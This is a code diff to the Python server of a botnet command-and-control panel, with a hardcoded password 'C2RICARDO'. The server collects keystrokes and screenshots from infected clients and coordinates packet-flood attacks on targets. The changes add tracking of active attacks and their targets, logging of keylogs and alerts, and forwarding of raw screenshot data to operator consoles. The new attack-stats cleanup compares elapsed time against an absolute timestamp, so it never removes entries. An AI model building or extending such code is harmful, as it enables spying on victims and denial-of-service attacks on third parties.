@@ -37,7 +37,7 @@ command_results = {}  # {command_id: result}
 pending_commands = defaultdict(list)  # {client_id: [commands]}
 authenticated_sessions = {}  # {session_id: expiry}
 console_sockets = []  # List of console socket IDs
-attack_stats = {}  # {attack_id: {clients: {client_id: packets}, total_packets: X}}
+attack_stats = defaultdict(lambda: {'clients': {}, 'total_packets': 0, 'start_time': time.time(), 'target': ''})
 
 # Dashboard password
 DASHBOARD_PASSWORD = "C2RICARDO"
@@ -363,11 +363,19 @@ def dashboard_html():
 def get_stats():
     """Get server statistics"""
     online = sum(1 for c in clients.values() if c.get('online', False))
+    
+    # Count active attacks
+    active_attacks = 0
+    for attack in attack_stats.values():
+        if time.time() - attack['start_time'] < 3600:  # Attacks in last hour
+            active_attacks += 1
+    
     return jsonify({
         'total': len(clients),
         'online': online,
         'commands': len(command_results),
         'screenshots': len([f for f in os.listdir('screenshots') if f.endswith('.png')]),
+        'attacks': active_attacks,
         'timestamp': time.time()
     })
 
@@ -639,6 +647,7 @@ def handle_ping_client(data):
 @socketio.on('keylog')
 def handle_keylog(data):
     """Forward keylog to consoles"""
+    print(f"[🔑] Keylog from {data.get('client_id', 'unknown')}: {len(data.get('keystrokes', ''))} chars")
     socketio.emit('keylog', data, namespace='/')
 
 @socketio.on('screenshot')
@@ -648,8 +657,8 @@ def handle_screenshot(data):
     img_data = data.get('data')
     
     if img_data:
-        # Decode and save screenshot
         try:
+            # Decode and save screenshot
             file_bytes = base64.b64decode(img_data)
             timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
             client_short = client_id[:8] if len(client_id) > 8 else client_id
@@ -661,12 +670,14 @@ def handle_screenshot(data):
             
             print(f"[📸] Screenshot received: {filename} ({len(file_bytes)} bytes)")
             
-            # Forward to consoles
+            # Forward to consoles WITH THE DATA
             socketio.emit('screenshot', {
                 'client_id': client_id,
                 'filename': filename,
+                'data': img_data,  # CRITICAL: Include the image data
                 'size': len(file_bytes),
-                'timestamp': time.time()
+                'timestamp': time.time(),
+                'filepath': file_path
             }, namespace='/')
         
         except Exception as e:
@@ -675,6 +686,7 @@ def handle_screenshot(data):
 @socketio.on('alert')
 def handle_alert(data):
     """Forward alert to consoles"""
+    print(f"[⚠️] Alert from {data.get('client_id', 'unknown')}: {data.get('message', '')}")
     socketio.emit('alert', data, namespace='/')
 
 @socketio.on('attack_status')
@@ -684,18 +696,36 @@ def handle_attack_status(data):
     client_id = data.get('client_id')
     packets_sent = data.get('packets_sent', 0)
     status = data.get('status', 'running')
+    target = data.get('target', 'unknown')
     
+    # Initialize attack stats if needed
     if attack_id not in attack_stats:
-        attack_stats[attack_id] = {'clients': {}, 'total_packets': 0, 'start_time': time.time()}
+        attack_stats[attack_id] = {
+            'clients': {}, 
+            'total_packets': 0, 
+            'start_time': time.time(),
+            'target': target
+        }
     
+    # Update client stats
     attack_stats[attack_id]['clients'][client_id] = packets_sent
     attack_stats[attack_id]['total_packets'] = sum(attack_stats[attack_id]['clients'].values())
+    
+    # Update target if provided
+    if target and target != 'unknown':
+        attack_stats[attack_id]['target'] = target
     
     # Forward to consoles
     socketio.emit('attack_status', data, namespace='/')
     
     # Log attack status
-    print(f"[💥] Attack {attack_id[:8]}: {client_id[:8]} sent {packets_sent:,} packets")
+    if status == 'started':
+        print(f"[💥] Attack STARTED: {attack_id[:8]} on {target} by {client_id[:8]}")
+    elif status == 'running':
+        if packets_sent % 1000 == 0:  # Log every 1000 packets
+            print(f"[💥] Attack {attack_id[:8]}: {client_id[:8]} sent {packets_sent:,} packets to {target}")
+    elif status in ['completed', 'stopped']:
+        print(f"[💥] Attack {status.upper()}: {attack_id[:8]} total {attack_stats[attack_id]['total_packets']:,} packets")
 
 @socketio.on('client_pong')
 def handle_client_pong(data):
@@ -715,10 +745,10 @@ def cleanup_thread():
             for cmd_id in old_cmds:
                 del command_results[cmd_id]
             
-            # Clean old files
+            # Clean old files (older than 24 hours)
             for folder in ['downloads', 'uploads', 'screenshots']:
                 if os.path.exists(folder):
-                    cutoff_time = time.time() - 86400  # 24 hours
+                    cutoff_time = time.time() - 86400
                     for filename in os.listdir(folder):
                         filepath = os.path.join(folder, filename)
                         if os.path.isfile(filepath):
@@ -727,6 +757,13 @@ def cleanup_thread():
                                     os.remove(filepath)
                                 except:
                                     pass
+            
+            # Clean old attack stats (older than 6 hours)
+            cutoff_attack = time.time() - 21600
+            old_attacks = [attack_id for attack_id, stats in attack_stats.items()
+                          if time.time() - stats['start_time'] > cutoff_attack]
+            for attack_id in old_attacks:
+                del attack_stats[attack_id]
             
             time.sleep(300)  # Run every 5 minutes
             
